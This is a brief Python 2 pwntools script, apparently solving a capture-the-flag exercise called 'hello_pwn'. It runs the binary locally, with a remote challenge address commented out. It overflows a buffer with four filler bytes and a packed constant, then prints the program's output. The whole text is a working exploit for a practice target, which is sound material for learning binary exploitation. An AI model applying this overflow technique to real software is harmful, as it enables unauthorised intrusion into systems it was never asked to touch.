from pwn import *
p = process("./hello_pwn")
#p = remote("111.198.29.45",30020)

payload = "a"*4 + p32(0x6E756161)
p.sendlineafter("bof\n",payload)
print p.recv()
print p.recv()
print p.recv()
